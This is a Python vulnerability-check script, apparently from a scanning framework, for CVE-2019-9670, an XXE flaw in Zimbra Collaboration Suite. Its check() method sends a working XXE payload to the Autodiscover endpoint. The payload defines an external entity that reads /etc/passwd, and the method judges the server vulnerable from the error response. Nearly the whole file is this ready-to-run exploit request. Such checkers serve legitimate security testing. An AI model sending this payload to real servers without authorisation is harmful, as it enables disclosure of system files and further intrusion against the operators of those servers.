#!/usr/bin/env python3

import re
from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class CVE_2019_9670_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-9670 XXE读取漏洞',
            'description': 'CVE-2019-9670 XXE读取漏洞,影响范围为: Synacor Zimbra Collaboration Suite 8.7.x before 8.7.11p10',
            'date': '2019-03-11',
            'exptype': 'check',
            'type': 'XXE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers={
            "User-Agent": get_useragent(),
            "Content-Type":"application/xml"
        }

    def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        data = """<!DOCTYPE xxe [
        <!ELEMENT name ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
         <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
            <Request>
              <EMailAddress>aaaaa</EMailAddress>
              <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
            </Request>
          </Autodiscover>
        """
        try:
            req = request.post(self.url + '/Autodiscover/Autodiscover.xml', headers = self.headers, data = data)
            if 'Error 503 Requested response schema not available' in req.text:
                print('存在CVE-2019-9670 XXE读取漏洞')
                return True
            else:
                print('不存在CVE-2019-9670 XXE读取漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在CVE-2019-9670 XXE读取漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2019_9670 = CVE_2019_9670_BaseVerify('https://127.0.0.1')
    CVE_2019_9670.check()